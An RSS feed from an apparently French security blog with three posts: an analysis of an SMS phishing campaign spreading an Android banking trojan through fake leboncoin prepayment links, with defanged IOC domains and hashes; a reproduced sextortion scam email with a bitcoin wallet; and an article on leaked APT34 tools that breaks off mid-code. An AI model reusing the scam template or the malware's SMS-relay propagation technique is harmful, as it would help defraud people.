@@ -1,0 +1,551 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Drama Alert &#8211; ~# Hackonch !</title>
+	<atom:link href="https://hackonch.ml/fr/category/drama-alert/feed/" rel="self" type="application/rss+xml" />
+	<link>https://tchernobyl.altervista.org</link>
+	<description>Sécurité rime avec Liberté</description>
+	<lastBuildDate>Tue, 23 Jul 2019 20:48:08 +0000</lastBuildDate>
+	<language>fr-FR</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.2.2</generator>
+
+<image>
+	<url>https://hackonch.ml/fr/wp-content/uploads/2019/08/favicon-1-90x90.png</url>
+	<title>Drama Alert &#8211; ~# Hackonch !</title>
+	<link>https://tchernobyl.altervista.org</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>Enquête: campagne russe de phishing via SMS sur leboncoin</title>
+		<link>https://hackonch.ml/fr/drama-alert/enquete-campagne-russe-de-phishing-via-sms-sur-leboncoin/</link>
+				<pubDate>Fri, 21 Jun 2019 04:57:17 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Drama Alert]]></category>
+		<category><![CDATA[Éditos]]></category>
+		<category><![CDATA[Malware-Hunting]]></category>
+		<category><![CDATA[Système]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1061</guid>
+				<description><![CDATA[<div class="post-excerpt">Coucou tout le monde, Si je vous dis: campagne de phishing massive, botnet russe, AndroidBanker et Leboncoin vous me répondez quoi ? Si vous avez répondu à haute voix (ou&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/drama-alert/enquete-campagne-russe-de-phishing-via-sms-sur-leboncoin/" class="btn btn-primary btn-effect btn-lg"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/enquete-campagne-russe-de-phishing-via-sms-sur-leboncoin/">Enquête: campagne russe de phishing via SMS sur leboncoin</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Coucou tout le monde, </p>
+<p>Si je vous dis: campagne de phishing massive, botnet russe, AndroidBanker et Leboncoin vous me répondez quoi ? </p>
+<p>Si vous avez répondu à haute voix (ou pas) « ARTICLE BIEN JUTEUX !!! » alors vous l&rsquo;avez dans le mille 🙂</p>
+<p>Internet est vaste et rempli de tous pleins de mystères. Et c&rsquo;est justement ce côté mystérieux qui me passionne. Vous comprenez donc que lorsque l&rsquo;on me tend un billet express pour découvrir les coulisses d&rsquo;une attaque (surtout comme celle-ci) je ne réfléchis pas deux fois !</p>
+<h3>1°) Le Contexte</h3>
+<p>Récement un de mes amis qui avait mis en vente un objet sur le leboncoin avait reçu un SMS lui notifiant qu&rsquo;il avait bien reçu le prépaiement de l&rsquo;objet en question.</p>
+<pre>[pseudo de mon ami] je vous ai envoyé le prepaiement www-leboncoin.com/357143040654321870</pre>
+<p>Avant d&rsquo;écrire cet article j&rsquo;ai essayé de voir si on en parlait ailleurs, et vous pourrez d&rsquo;ailleurs le vérifier, il n&rsquo;y a que le forum UFC qui en parle ainsi qu&rsquo;un Tweet de l&rsquo;ami benkow_ le tout sans trop rentrer dans le détail.</p>
+<blockquote class="twitter-tweet" data-lang="en">
+<p lang="en" dir="ltr">hxxp://cd78cg210xy0[.]com/3lfk3jGj/admindo/login.php Android SMS Loader. Was used to spread a banker (apk) targeting french people last week <a href="https://t.co/Fup7hvRUKX">https://t.co/Fup7hvRUKX</a><a href="https://t.co/5M1MGryN9T">pic.twitter.com/5M1MGryN9T</a></p>
+<p>&mdash; Benkøw moʞuƎq (@benkow_) <a href="https://twitter.com/benkow_/status/1082229806190731265?ref_src=twsrc%5Etfw">January 7, 2019</a></p></blockquote>
+<p>Une fois le lien ouvert, une page similaire à celle du tweet est affiché. Bien sûr, le contenu ne peut pas s&rsquo;afficher en entier si on ne télécharge bien évidemment pas l&rsquo;appli. Et puis là, comme pour signifier l&rsquo;excitation de l&rsquo;auteur, les fautes de français se multiplient juqu&rsquo;au drame&#8230;</p>
+<p>La plupart des utilisateurs qui se font avoir par cette hideuse arnaque sont sauvés grâce à cet écran: </p>
+<p><img src="https://www.pronosoft.com/fr/appli/android/msg.png" /></p>
+<p>Ou encore grâce à celui-là pour les moins soucieux:</p>
+<p><img src="https://img1.koplayer.com/ScreenShot/com.antivirus/corwdYPO6EJ0GSM0-KSfKDDvF6aleCuEP93xqz2MryFdh7A3dKbupAcbMfoTZnKQ3jxc_50.png" /></p>
+<p>Eh oui! Bien que troublante d&rsquo;ingéniosité sur de nombreux points, cette campagne tombe à l&rsquo;eau car nombreux sont à avoir reçu la notif mais peu sont allé juqu&rsquo;à tout faire pour avoir le petit fichier .apk installé sur leur téléphone.</p>
+<h3>2°) La charge utile (le fichier .apk)</h3>
+<p>Le fichier est très léger (pour une application 🙂 ), pas plus de 300 Ko.<br />
+Dès son execution, la fausse appli va se connecter au faux site afin que la victime puisse entrer ses coordonnées bancaires (bye bye les sous-sous).<br />
+Une fois cela fait, une connexion directe avec le serveur de Contrôle et de Commande (C2C) va s&rsquo;opérer et via un fichier « gate.php », le serveur donne au zombie une sorte de mutex (en gros un identifiant, ex: 543759810537698240). </p>
+<p>Et c&rsquo;est là, que ça devient marrant: </p>
+<p>Les auteurs semblent avoir initialement prévu de s&rsquo;occuper d&rsquo;un botnet android via HTTP totalement soumis et dévoué à son C2C (serveur de Contrôle et de Commande). Le truc, c&rsquo;est que sur Android, il n&rsquo;y a pas vraiment de véritables moyens de persistance comme sur d&rsquo;autres systèmes 🙁 . </p>
+<p>Par exemple, la permission d&rsquo;exécution en arrière-plan est choisie par l&rsquo;utilisateur lors de l&rsquo;installation et même si elle est activée, rien ne garantie que le démon (le service de l&rsquo;application) va bien se lancer de manière autonome après un redémarrage du téléphone. </p>
+<p>Sans parler du fait qu&rsquo;un téléphone portable reste rarement au même endroit (logique en même temps) et que du coup Internet ne va pas forcément fonctionner tout le temps (surtout si la victime est un prolétaire avec un forfait Internet tout pourri 🙂 ) </p>
+<p>Mais ne vous en faites pas, de ce côté les auteurs ont eu une idée de génie pour propager le malware (si si vraiment). Aller je vous donne un indice, voici les permissions que la fausse application demande au moment de l&rsquo;installation:</p>
+<pre>
+    android.permission.CALL_PHONE          
+    android.permission.CHANGE_WIFI_STATE
+    android.permission.GET_TASKS
+    android.permission.INTERNET           
+    android.permission.READ_PHONE_STATE
+    android.permission.READ_SMS
+    android.permission.RECEIVE_SMS
+    android.permission.SEND_SMS
+    android.permission.SYSTEM_ALERT_WINDOW
+    android.permission.BIND_ACCESSIBILITY_SERVICE
+    android.permission.ACCESS_NETWORK_STATE
+    android.permission.ACCESS_WIFI_STATE
+    android.permission.CHANGE_NETWORK_STATE
+    android.permission.REAL_GET_TASKS
+    android.permission.RECEIVE_BOOT_COMPLETED
+    android.permission.USES_POLICY_FORCE_LOCK
+    android.permission.VIBRATE
+    android.permission.WAKE_LOCK
+    android.permission.WRITE_SETTINGS</pre>
+<p>Bon je l&rsquo;avoue il n&rsquo;y a rien de très exatraordinaire là-dedans étant donné qu&rsquo;il s&rsquo;agit de permissions de backdoor tout ce qu&rsquo;il y a de plus standard&#8230; à part un tout petit détail. Le genre de tout petit détail qu&rsquo;on zappe sur le moment mais qu&rsquo;une fois qu&rsquo;on tilte on se dit « Non de Zeus ! »</p>
+<p><img src="https://media1.tenor.com/images/e0cb7e6a71710790fea998bd723f85a9/tenor.gif" /></p>
+<p>En effet, lorsque je menais mon enquête avec mon ami (que je remercie au passage), nous sommes tombés sur ce <a href="https://forum.quechoisir.org/prepaiement-leboncoin-arnaque-t202367.html" rel="noopener noreferrer" target="_blank">topic</a> du forum UFC que choisir</p>
+<p>C&rsquo;est plus précisément ce passage qui nous intéresse ici: </p>
+<p>« j&rsquo;ai contacté le 06 qui m&rsquo;a envoyé ce message, la presonne m&rsquo;a répondu, il était asellé de coup de téléphone comme le mien !! Lui avait réussi à installer le .apk où on lui demandait de fournir ses coordonnées bancaires pour finaliser le prépaiement !! »</p>
+<p>Quand on lit ça, on se dit « Bien évidemment que l&rsquo;expéditeur a réussi à installer le .apk, c&rsquo;est le méchant pirate! En plus trop marrant il se fait harceler par les victimes #trop_drôle ! »</p>
+<p>Oui mais non! Vous souvenez de l&rsquo;identifiant généré par le fichier « gate.php » sur le faux site ? Et de l&rsquo;identifiant dans l&rsquo;URL du SMS envoyé à la victime ?</p>
+<p>Vous l&rsquo;avez sans doute compris, le SMS reçu par la victime a été en réalité envoyé par&#8230; une autre victime et ce totalement à son insu !</p>
+<p>Et ça, c&rsquo;est du génie. En effet, plutôt que d&rsquo;envoyer eux-même le SMS de phishing et ainsi laisser leur numéro de téléphone, en soit une preuve qui pourrait directement nous conduire à eux, les auteurs se servent des téléphones backdoorés afin de relayer les messages aux victimes potentielles. </p>
+<p>Le seul hic dans cette technique de génie, c&rsquo;est qu&rsquo;il semblerait que les pirates aient mal implémenté leur trouvaille. En effet, le fait que l&rsquo;expéditeur du fameux message de phishing soit harcelé, indique très clairement que la façon de faire des pirates est très peu réfléchie. Ce qui est plutôt paradoxal quand on voit l&rsquo;arsenal, digne des plus grands groupes de cybercriminels, déployé pour cette campagne de phishing.</p>
+<p>Pour illustrer un peu mieux mes propos laissez moi vous faire une petite liste :</p>
+<h4>Les arguments qui tendent à prouver qu&rsquo;il s&rsquo;agisse de script-kiddies:</h4>
+<ul>
+<li>TOUS les virus ayant un lien avec cette organisation sont détectés par une vaste majorité d&rsquo;antivirus</li>
+<li>Les certificats sont auto-signés à l&rsquo;arrache (Ex: « CN:dddddddd fdfd » pour la backdoor leboncoin) alors qu&rsquo;ils ont des milliers de domaines</li>
+<li>Les auteurs ne ciblent *exclusivement* que deux plateformes: Windows et Android, à croire qu&rsquo;ils ne connaissent que ces deux-là 🙂 </li>
+<li>Certains codes sont des copiés collés de code retrouvé sur Github, Pastebin ou même StackOverflow (les crédits en moins)</li>
+<li>Il est très facile de remonter à leur serveur de Contrôle et de Commande </li>
+<li>Certains de leurs virus sont de véritables « call center » avec plus d&rsquo;une centaine d&rsquo;addresses IP différentes contactées dès les premières secondes de l&rsquo;exécution</li>
+<li>Ils utilisent Virus Total pour voir si leur Backdoors sont détectés par des antivirus</li>
+</ul>
+<h4>Maintenant quelques points qui, je dois le reconnaître montrent le caractère quelque peu « déterminé » des auteurs :</h4>
+<ul>
+<li>Beaucoup *beaucoup* de serveurs (majoritairement russes d&rsquo;ailleurs)</li>
+<li>Véritable gestion du versionnage des logiciels malveillants</li>
+<li>Utilisation et implémentation de fonctions cryptographiques (RSA notamement)</li>
+<li>Exportation des attaques (d&rsquo;abord en Russie, puis en Chine et récemment en France avec l&rsquo;arnaque leboncoin)</li>
+<li>Énormément (des milliers) de noms de domaines enregistrés en moins de 6 mois (essentiellement à des fins de phishing)</li>
+<li>Portabilité de l&rsquo;infrastructure de contrôle (elle change d&rsquo;adresse IP / Web régulièrement)</li>
+<li>Suppression des traces dans le code (version de l&rsquo;IDE, date de compilation)</li>
+</ul>
+<h5>Point additionnel: </h5>
+<p>Mon ami et moi avions réussi à trouver leur serveur de contrôle et de commande. En revanche, il ne ressemblait à rien de ce qui se faisait ailleurs. La page d&rsquo;accueil du serveur Web affichait une page par défaut Apache / Cent OS alors que les headers HTTP affichait très clairement Nginx. Après vérification on trouvera par la suite qu&rsquo;il s&rsquo;agissait d&rsquo;une version d&rsquo;Ubuntu. </p>
+<p>En cherchant un peu on a même réussi à trouver une véritable vulnérabilité en or massif qui nous a permis de confirmer qu&rsquo;il s&rsquo;agissait d&rsquo;une solution totalement custom. Pour la petite histoire on a d&rsquo;ailleurs retrouvé des traces de précédentes installations (test ?) non fonctionnelles sur deux sites compromis d&rsquo;entreprises (1 américaine et 1 indienne).</p>
+<h3>3°) Verdict </h3>
+<p>Cette attaque a sur le papier largement de quoi effrayer de par sa sophistication (copie conforme des codes graphiques leboncoin, utilisation de la nouvelle fonctionnalité de prépaiement comme prétexte pour le phishing, relai SMS des victimes pour propager le malware &#8230;). Cependant, dans les faits, l&rsquo;attaque n&rsquo;ébranle pas forcément voire carrément pas du tout la communauté leboncoin.</p>
+<p>Honnêtement j&rsquo;ai presque de la peine pour les auteurs lorsque je vois toutes les bonnes idées et tous les efforts qu&rsquo;ils ont fournis en créant leurs propres trucs de A à Z mais que pas de bol, le truc à totalement bidé. Comme quoi, le crime ne paie pas 🙂 </p>
+<p><u>TELEX:</u> en guise de contre-mesure simple mais efficace, pensez seulement à être plus attentif aux liens avant de cliquer directement.</p>
+<h3>Bonus: IOC&rsquo;s de la campagne </h3>
+<pre>
+hxxp://gb-leboncoin[.]info
+hxxp://uk-leboncoin[.]info
+hxxp://uk-leboncoin[.]top
+hxxp://gb-leboncoin[.]top
+hxxp://www.m-leboncoin[.]info
+hxxp://www.gb-leboncoin[.]top
+hxxp://www.e-leboncoin[.]info
+hxxp://www.u-leboncoin[.]info
+hxxp://www.www-leboncoin[.]info
+hxxp://www.e-leboncoin[.]top
+hxxp://www.gb-leboncoin[.]info
+hxxp://fr-leboncoin[.]top
+hxxp://a-leboncoin[.]top
+hxxp://t-leboncoin[.]info
+hxxp://www.uk-leboncoin[.]info
+hxxp://www.mob-leboncoin[.]info
+hxxp://www.a-leboncoin[.]top
+hxxp://leboncoin-ql[.]top
+hxxp://fr-leboncoin[.]info
+hxxp://mob-leboncoin[.]info
+hxxp://www.uk-leboncoin[.]top
+hxxp://u-leboncoin[.]info
+hxxp://www.mob-leboncoin[.]top
+hxxp://www.t-leboncoin[.]top
+hxxp://m-leboncoin[.]info
+hxxp://www.leboncoin-ql[.]top
+hxxp://u-leboncoin[.]top
+hxxp://od-leboncoin[.]info
+hxxp://www.od-leboncoin[.]info
+hxxp://www.fr-leboncoin[.]info
+hxxp://www.t-leboncoin[.]info
+hxxp://llc-leboncoin[.]top
+hxxp://www.llc-leboncoin[.]top
+hxxp://www.u-leboncoin[.]top
+hxxp://www-leboncoin[.]info
+hxxp://www.od-leboncoin[.]top
+hxxp://t-leboncoin[.]top
+hxxp://e-leboncoin[.]top
+hxxp://od-leboncoin[.]top
+hxxp://mob-leboncoin[.]top
+hxxp://e-leboncoin[.]info
+hxxp://www.fr-leboncoin[.]top
+hxxp://leboncoin-xc[.]top
+hxxp://a-leboncoin[.]info
+hxxp://my-leboncoin[.]top
+hxxp://www.my-leboncoin[.]top
+hxxp://www.a-leboncoin[.]info
+hxxp://www.llc-leboncoin[.]info
+hxxp://www.leboncoin-ql[.]info
+hxxp://my-leboncoin[.]info
+hxxp://www.leboncoin-tr[.]top
+hxxp://leboncoin-tr[.]top
+hxxp://www.my-leboncoin[.]info
+hxxp://llc-leboncoin[.]info
+hxxp://leboncoin-ql[.]info
+hxxp://leboncoin-bk[.]top
+hxxp://www.leboncoin-my[.]top
+hxxp://leboncoin-my[.]info
+hxxp://www.leboncoin-bk[.]top
+hxxp://leboncoin-my[.]top
+hxxp://www.leboncoin-my[.]info
+hxxp://leboncoin-bk[.]info
+hxxp://leboncoin-tr[.]info
+hxxp://www.leboncoin-tr[.]info
+hxxp://www.leboncoin-bk[.]info
+hxxp://www.leboncoin-vd[.]info
+hxxp://leboncoin-vd[.]top
+hxxp://leboncoin-vd[.]info
+hxxp://www.leboncoin-vd[.]top
+hxxp://leboncoin-cz[.]top
+hxxp://www.leboncoin-cz[.]top
+hxxp://www.leboncoin-cz[.]info
+hxxp://leboncoin-cz[.]info
+hxxp://leboncoin-jp[.]top
+hxxp://leboncoin-jp[.]info
+hxxp://leboncoin-xc[.]info
+hxxp://www.leboncoin-xc[.]info
+hxxp://www.leboncoin-jp[.]info
+hxxp://www.leboncoin-jp[.]top
+hxxp://leboncoin-mp[.]top
+hxxp://www.leboncoin-xc[.]top
+hxxp://leboncoin-lx[.]top
+hxxp://leboncoin-lp[.]info
+hxxp://leboncoin-ml[.]top
+hxxp://leboncoin-kp[.]top
+hxxp://leboncoin-kz[.]top
+hxxp://leboncoin-lv[.]top
+hxxp://leboncoin-sl[.]top
+hxxp://arbeit.jobs-hegele[.]in
+
+08/05/2019 com.bertjerts 172eb70cd27b6d24b47abe39c887c2fd6164f238a4c18877aad139c1de9ed6a9
+08/05/2019 com.backsmart a289da988c92c9889c0efb9901b5e875fb2a37dbb0cbd31708dba647bdf4c403
+12/05/2019 com.bertrander 5f7b91bcd4877802a5b1a69bb322fa934d4a9ec1b5ac1a472636de57c33e07c3
+18/05/2019 com.jertay 1bc805d19613bbab15027bd7d29a5bc3b8709bff0c7fd49cf04bb998cfc09b0d
+08/06/2019 com.garson f22ea76a0d69cf03915fd17f6472b790c21fecea70ff94520cbed71e8eeba198
+
+11/06/2019 com.lebronjoin b9610d39792609dc56fe0058571ec786df65e43e522d123eb26b5c5532737234 (WTF le nom ?)
+11/06/2019 com.berlins 225023859abbad7f788a47dd72ea3b702799360b50b69dc670b6fb1c02e5bf64
+
+</pre>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/enquete-campagne-russe-de-phishing-via-sms-sur-leboncoin/">Enquête: campagne russe de phishing via SMS sur leboncoin</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Le hacking en 2019 : Les mails de chantages au bitcoin</title>
+		<link>https://hackonch.ml/fr/drama-alert/le-hacking-en-2019-les-mails-de-chantages-au-bitcoin/</link>
+				<pubDate>Mon, 27 May 2019 15:34:20 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Drama Alert]]></category>
+		<category><![CDATA[Vie Privée]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=1056</guid>
+				<description><![CDATA[<div class="post-excerpt">Salut tout le monde, En ce moment pas mal de gens dans mon entourage me disent avoir reçu un mail envoyé depuis leur propre adresse mail. En général, le mail&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/drama-alert/le-hacking-en-2019-les-mails-de-chantages-au-bitcoin/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/le-hacking-en-2019-les-mails-de-chantages-au-bitcoin/">Le hacking en 2019 : Les mails de chantages au bitcoin</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Salut tout le monde,</p>
+<p>En ce moment pas mal de gens dans mon entourage me disent avoir reçu un mail envoyé depuis leur propre adresse mail. En général, le mail prend la forme du chantage d&rsquo;un hacker par mail avec une demande de rançon pour garder un « petit secret » avec une adresse bitcoin en bas de page. En voici un exemple :</p>
+<pre>Sujet: Ceci concerne la question de votre sécurité 
+
+Bonjour, cher [votre mail]. 
+
+Nous avons installé un logiciel RAT dans votre appareil. 
+Pour l'instant, votre compte e-mail est piraté (voir pour , j'ai maintenant accès à vos comptes). 
+J'ai téléchargé toutes les informations confidentielles de votre système et j'ai obtenu des preuves supplémentaires. 
+La chose la plus intéressante que j'ai découvert est celui des enregistrements vidéo de votre masturbation. 
+J'ai posté mon virus sur un site porno, puis vous l'avez installé sur votre système d'exploitation. 
+Lorsque vous avez cliqué sur le bouton Play on porn video, à ce moment-là mon troyen a été téléchargé sur votre appareil. 
+Après l'installation, votre caméra frontale prend une vidéo chaque fois que vous vous masturbez. De plus, le logiciel est synchronisé avec la vidéo de votre choix. 
+Pour le moment, le logiciel a collecté toutes vos informations de contact sur les réseaux sociaux et les adresses e-mail 
+Si vous devez effacer toutes vos données collectées, envoyez-moi 250$ en BTC (crypto-monnaie). 
+Ceci est mon portefeuille Bitcoin: 18firbfmx4KoNeM4cBhcDdXgp2Aiduo43G 
+Vous avez 2 jours après avoir lu cette lettre. 
+Après votre transaction, je vais effacer toutes vos données. 
+Sinon, je vais envoyer une vidéo avec vos farces à tous vos collègues et amis !!! 
+Et désormais, soyez plus prudent! 
+Visitez uniquement les sites sécurisés! 
+Au revoir! 
+------------------ 
+</pre>
+<h3>Qu&rsquo;est-ce que c&rsquo;est ?</h3>
+<p>Alors tout d&rsquo;abord, la première chose qui me choque là-dedans c&rsquo;est les fautes de français. Très sérieusement le fait qu&rsquo;il n&rsquo;y ait aucune faute de grammaire mais que syntaxiquement parlant tout soit à refaire indique très clairement qu&rsquo;il s&rsquo;agit d&rsquo;un mail copié collé directement de Google Traduction. On a donc affaire à une démonstration d&rsquo;attaque de masse.</p>
+<p>Ensuite, ce que je trouve plutôt « marrant » c&rsquo;est que l&rsquo;attaquant dit avoir réussi à pirater l&rsquo;appareil de la victime avec ici un RAT. Pour ceux qui ne savent pas ce que c&rsquo;est, je vous invite à jeter un petit coup d’œil à <a href="https://blog.tchernobyl.ml/systeme/les-r-a-t-ou-les-pires-arnaques-du-web/">mon article sur les RAT</a>. Le truc qui ne tient pas la route, c&rsquo;est qu&rsquo;aucun hacker ne serait assez stupide pour révéler à la victime comment il a fait pour en arriver là.</p>
+<p>C&rsquo;est typiquement ce qu&rsquo;en psychologie on appelle ça un argument d&rsquo;autorité: « je suis un hacker DONC je sais de quoi je parle »</p>
+<p>En effet, en disant à la victime, qui n&rsquo;y connaît d&rsquo;ailleurs pas grand-chose, pleins de mots très techniques sur comment il aurait pu faire pour la pirater donne du crédit au discours, donc au mail alors que je le répète AUCUN PIRATAGE N&rsquo;A EU LIEU (du moins aucun en rapport avec ce mail 🙂 )</p>
+<h3>Que faire ?</h3>
+<p>Si votre mot de passe est divulgué dans le mail, changer le tout de suite ! À part ça, il ne faut A-B-S-O-L-U-M-E-N-T rien faire. En effet, il ne faut ni supprimer le mail (destruction de preuves 🙂 ), ni chercher à répondre à l&rsquo;attaquant vous pourriez lui envoyer sans le vouloir de précieuses informations.</p>
+<p><center><img class="alignnone size-full wp-image-1051" src="https://blog.tchernobyl.ml/wp-content/uploads/2019/05/everybody-is-being-hacked-while-im-just-sitting-here-doing-absolutely-nothing.jpg" alt="everybody-is-being-hacked-while-im-just-sitting-here-doing-absolutely-nothing" width="469" height="359" /></center></p>
+<h3>Qui sont les « hackers » ?</h3>
+<p>La suite logique serait maintenant de se demander qui est derrière tout ça. En vérité, il faut savoir que ce genre de campagne de mails malveillants que certains experts appellent d&rsquo;ailleurs « sextortion » est un phénomène relativement récent dans les internets français.</p>
+<p>En effet, les premières traces de campagnes massives de ce genre ne remontent qu&rsquo;à la fin d&rsquo;année 2018. On peut donc penser qu&rsquo;il y a eu une première campagne « test » qui a dû fonctionner étant donné qu&rsquo;elle a donné lieu à une seconde campagne qui se déroule en ce moment même. La principale différence notable, c&rsquo;est que lors de cette seconde vague, beaucoup plus de mails sont utilisés et ceux-ci sont de plus mauvaise qualité que dans la première campagne (qui ne s&rsquo;appuyait que sur un unique modèle de mail).</p>
+<p>On peut donc penser que les auteurs ne sont pas les mêmes et que la dernière campagne est plus une réplique Eco+ de la première. De plus le fait que les pirates fassent autant de fautes de français indiquer clairement qu&rsquo;ils opèrent hors de l&rsquo;hexagone.</p>
+<h3>Conclusion</h3>
+<p>Cette dernière campagne de sextorsion indique très clairement que les pirates qui sont derrière tout ça ont très bien compris que l&rsquo;attaque pouvait être très lucrative.</p>
+<p>On peut donc imaginer voir de plus en plus de campagnes de chantages de ce genre par mails. C&rsquo;est pourquoi pour vaincre ce fléau il faut à tout prix éviter de financer ces véritables escrocs du net et sensibiliser son entourage. Profitez-en pour partager cet article à vos amis ou vos collègues 🙂</p>
+<p>À très bientôt !</p>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/le-hacking-en-2019-les-mails-de-chantages-au-bitcoin/">Le hacking en 2019 : Les mails de chantages au bitcoin</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>APT 34 piraté &#8211; 18 Mo de données dans la nature</title>
+		<link>https://hackonch.ml/fr/drama-alert/apt-34-pirate-18-mo-de-donnees-dans-la-nature/</link>
+				<pubDate>Mon, 22 Apr 2019 15:36:00 +0000</pubDate>
+		<dc:creator><![CDATA[~# Hackonch !]]></dc:creator>
+				<category><![CDATA[Drama Alert]]></category>
+
+		<guid isPermaLink="false">https://blog.tchernobyl.ml/?p=825</guid>
+				<description><![CDATA[<div class="post-excerpt">Bonjour tout le monde, Il y a peu de temps, je vous parlais d&#8217;un groupe de pirates de haut vol, très probablement affiliés au gouvernement chinois (pour ceux qui voudraient&#8230;</div>
+<div class="post-more"><a href="https://hackonch.ml/fr/drama-alert/apt-34-pirate-18-mo-de-donnees-dans-la-nature/" class="btn btn-primary btn-effect"><span>Lire l&#039;Article</span><span><i class="icon icon-arrow-right"></i></span></a></div>
+<p>The post <a rel="nofollow" href="https://hackonch.ml/fr/drama-alert/apt-34-pirate-18-mo-de-donnees-dans-la-nature/">APT 34 piraté &#8211; 18 Mo de données dans la nature</a> appeared first on <a rel="nofollow" href="https://tchernobyl.altervista.org">~# Hackonch !</a>.</p>
+]]></description>
+								<content:encoded><![CDATA[<p>Bonjour tout le monde, </p>
+<p>Il y a peu de temps, je vous parlais d&rsquo;un groupe de pirates de haut vol, très probablement affiliés au gouvernement chinois (pour ceux qui voudraient lire l&rsquo;article en question, c&rsquo;est par <a href="https://blog.tchernobyl.ml/fun/dissection-dune-attaque-de-masse-chinoise/">ici</a> que ça se passe).</p>
+<p>Pendant la rédaction de l&rsquo;article précédent, je m&rsquo;étais beaucoup documenté sur ces groupes « APT » qui sont pour la plupart sponsorisés par un état « non allié » (Russie, Chine, Iran, Corée Du Nord&#8230;).<br />
+Ce que je trouve paradoxal c&rsquo;est que sur des sites comme FireEye ou CrowdStrike qui sont normalement spécialisés là dedans on ne retrouve pas de groupes APT qui seraient issus d&rsquo;un gouvernement « allié ». </p>
+<p>Je ne trouve pas ça très transparent, surtout quand on sait de quoi sont capables des puissances « alliées » comme les États-Unis ou le Royaume-Uni. Il n&rsquo;y a qu&rsquo;à rappeler le scandale du piratage d&rsquo;Equation Group par Shadow Brokers qui a occasionné une fuite d&rsquo;exploits et de kits qui ont, entre autres, engendrés ce véritable carnage qu&rsquo;a été WannaCry.</p>
+<p>Cela me fait une belle transition pour parler de cette fuite de données, qu&rsquo;a subit APT34 (OilRig, Helix Kitten) un groupe de hacker de haut vol suspectés d&rsquo;appartenir au gouvernement iranien.</p>
+<p><img src="https://hackonch.ml/fr/wp-content/uploads/2019/04/823237_JAKGUSWFHXQ5SPW.jpg" alt="image" /></p>
+<p>Le truc le plus dingue, c&rsquo;est qu&rsquo;en plus des outils de piratage, notre cher Dookhtegan a également publié des données sur certaines des victimes du piratage qui semblent appartenir à APT34, notamment des identifiants et des mots de passe qui semblent être collectées via des pages de phishing.</p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_U6YAJ9KWHV6Z6EH.jpg" alt="image" /></p>
+<p>Ainsi que des informations sur certains membres des services de renseignement iraniens</p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_X6DKQ3DN576BJZK.jpg" alt="image" /></p>
+<p>À en juger par son attaque contre les intérêts iraniens, on peut supposer qu&rsquo;il s&rsquo;agisse là de la riposte d&rsquo;un autre gouvernement aux attaques d&rsquo;APT 34: </p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_DTDQNBPS2H7GPRW.jpg" alt="image" /></p>
+<p>L&rsquo;archive ressemble à ceci: </p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_TTM34XWXUW8DUCH.jpg" alt="image" /></p>
+<p>Jusqu&rsquo;à présent, le ou les pirates ont fait fuiter le code source de six outils de piratage, ainsi que celui de plusieurs Webshells.</p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_ENND7ZRY9E7ZUCF.jpg" alt="image" /></p>
+<p>Les outils de piratage qui ont fuités sont les suivants:</p>
+<p>&#8211; PoisonFrog (ancienne version de BondUpdater)</p>
+<p>&#8211; HyperShell (un webshell nommée TwoFace)</p>
+<p>&#8211; HighShell (un autre Webshell)</p>
+<p>&#8211; Webmask (ou comment transformer n&rsquo;importe quel serveur Debian en agrégateur de la NSA avec DNSpionage)</p>
+<h3>Analyse des outils:</h3>
+<h4> Poisonfrog </h4>
+<p>En deux parties (client et serveur):</p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_TEX5QSA5VWRGGVM.jpg" alt="client" /></p>
+<p>On pourra d&rsquo;ailleurs remarquer que le client est écrit en Node.JS et que la partie serveur en Powershell:</p>
+<p><img src="https://blog.tchernobyl.ml/wp-content/uploads/2019/04/823237_BKNT4DHPJT99545.jpg" alt="serveur" /></p>
+<pre>
+${global:$address1} = $env:PUBLIC + "Public";
